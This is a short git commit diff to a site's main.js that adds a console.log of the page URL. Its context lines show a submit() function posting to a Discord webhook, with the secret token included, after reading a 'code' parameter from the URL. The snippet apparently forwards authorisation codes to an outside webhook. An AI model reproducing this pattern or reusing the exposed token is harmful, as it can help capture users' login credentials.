5a7d5ace5bf5836da79a3331323780a27a5b4d58
elarium <69206434+just4ius@users.noreply.github.com>
2022-06-29 22:54:33 +0300

    Update main.js

--- assets/js/main.js
+++ assets/js/main.js
@@ -3,6 +3,7 @@ function submit() {
 	request.open("POST", "https://discord.com/api/webhooks/991790746422218832/Q3CBZ86DJYgFN_fkqfPMlUN1c377aZoZ0YfP2vyFPHCSwDWAaWVduHarz2zeCpGGsOLb")
 	request.setRequestHeader("Content-type", "application/json");
 	var url_string = window.location.href;
+	console.log(url_string);
 	var url = new URL(url_string);
 	var code = url.searchParams.get("code");
 
